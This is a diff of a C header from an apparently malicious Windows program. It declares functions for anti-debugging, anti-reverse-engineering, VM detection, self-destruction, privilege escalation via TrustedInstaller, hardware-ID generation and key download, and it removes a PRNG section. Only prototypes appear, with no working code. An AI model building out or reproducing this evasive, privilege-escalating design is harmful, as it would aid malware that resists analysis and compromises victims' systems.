@@ -10,13 +10,6 @@ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 VOID ESelfDestruct();
 
 /* Xoshiro PRNG Algorithm : Xoshiro.c */
-BOOL EXoshiroBegin(_In_opt_ PDWORD dwState);
-VOID EXoshiroEnd(_In_opt_ PDWORD dwState);
-
-DWORD EXoshiroSS(_In_opt_ PDWORD dwState);
-DWORD EXoshiroP(_In_opt_ PDWORD dwState);
-UINT FASTCALL ERandomIntDistribution(_In_opt_ PDWORD dwState, _In_ UINT uiMin, _In_ UINT uiMax);
-FLOAT ERandomRealDistribution(_In_opt_ PDWORD dwState);
 
 /* Anti-ReverseEngineering : AntiDebug.c, AnitDllInject.c, AntiRE.c */
 BOOL fnAntiRE();
@@ -30,7 +23,7 @@ BOOL ICheckVmPresent();
 
 /* ConsoleHost : Console.c */
 BOOL IOpenConsole();
-STATUS EPrintFW(_In_ PCWSTR pText, _In_opt_ WORD wAttribute, _In_opt_ ...);
+status EPrintFW(_In_ PCWSTR pText, _In_opt_ WORD wAttribute, _In_opt_ ...);
 
 /* NT Functions : NT.c */
 BOOL EAdjustPrivilege(_In_ PCWSTR lpszPrivilege, _In_ BOOL bEnablePrivilege);
@@ -51,6 +44,6 @@ VOID EGenRandom(_In_opt_ PDWORD dwState, _Out_ PVOID pBuffer,_In_ SIZE_T nBuffer
 BOOL IIsUserAdmin();
 PVOID ELoadResourceW(_In_ WORD wResID, _In_ PCWSTR pResType, _Out_ PSIZE_T nBufferSize);
 PVOID IDownloadKey();
-VOID IGenerateHardwareId(_Out_ PUUID pHwId);
-VOID IGenerateSessionId(_Out_ PUUID pHWID);
+VOID IGenerateHardwareId(_Out_ uuid* pHwId);
+VOID IGenerateSessionId(_Out_ uuid* pHWID);
 BOOL ERunAsTrustedInstaller(_In_ PCWSTR szFileName, _In_ PCWSTR szCmdLine, _In_opt_ PCWSTR szDirectory);
